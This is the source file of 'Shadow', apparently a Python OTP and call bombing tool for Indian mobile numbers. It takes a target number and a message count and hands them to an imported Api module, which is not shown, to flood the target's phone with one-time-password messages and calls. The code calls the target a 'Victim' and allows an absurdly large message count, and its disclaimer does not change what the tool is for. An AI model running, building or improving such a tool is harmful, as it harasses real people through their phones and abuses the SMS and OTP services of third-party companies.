import random
from requests import get
import argparse
import os
import time
from api import Api
import sys

def check():
    try:
        get("https://www.dopesatan.ml/")
        internet = True
        print(color)
        print("\t\t\t\t Bombing Started...")
    except:
        print(color)
        print("\tYou are not Conected to Internet. Please Turn on your Mobile Data")
        exit()

def banner():
    os.system('''
	figlet -c -k  Shadow
	echo  "                                                         - Zodiac"
	printf " "
	printf "\e[1;32m                      .:.:.\e[0m\e[1;32m OTP && CALL bombing tool  \e[0m\e[1;32m.:.:.\e[0m\n"
	printf "\e[1;32m                  .:.:.\e[0m\e[1;32m made by \e[31m Zodiac - Nihal Kadengal\e[0m \e[0m\e[1;32m.:.:.\e[0m\n"
    printf "\e[1;32m          .:.:.\e[0m\e[1;32m Only Indian mobile numbers are currently supported\e[0m \e[0m\e[1;32m.:.:.\e[0m\n"
	printf "\n"
	printf "         \e[101m\e[1;77m  DISCLAIMER: Developer will not be liable and will not become  \e[0m\n"
	printf "         \e[101m\e[1;77m     responsible for any misuse or damage caused by Shadow     \e[0m\n"
    printf "         \e[101m\e[1;77m        Please do not use this script for taking Revenge        \e[0m\n"
	printf "\n"
	''')

color='\033[1;33m'
print('\n\n')




parser = argparse.ArgumentParser()
parser.add_argument('-t', type=str, default=0, help="Use this Argument to Add Target.")
parser.add_argument('-m', type=int, default=0, help="Use this Argument to Set Number of Msgs You want to Send.")

args = parser.parse_args()
target = str(args.t)
msgs = args.m
if  target == '':
    banner()
    print("Please Enter the Number of Target with -t Argument (use -h Argument for Help)")
elif msgs == 0:
    banner()
    print("Please Enter the Number of Msgs with -m Argument (use -h Argument for Help)")
elif msgs>10000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000:
    banner()
    print(color)
    print("This isn't fair, you are trying to ruin your Victim")
elif len(target)==10 and msgs<=10000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000:
        print(color)
        banner()
        check()
        Api.infinite(target, color, msgs)
        banner()
        print(color)
        print("\t\t\t\t\t   Bombed "+str(msgs)+" Msgs Successfully...")
else:
    print("Please Enter Correct Mobile Number and Number of Msgs or Contact Zodiac (instagram: @nihal07._)")
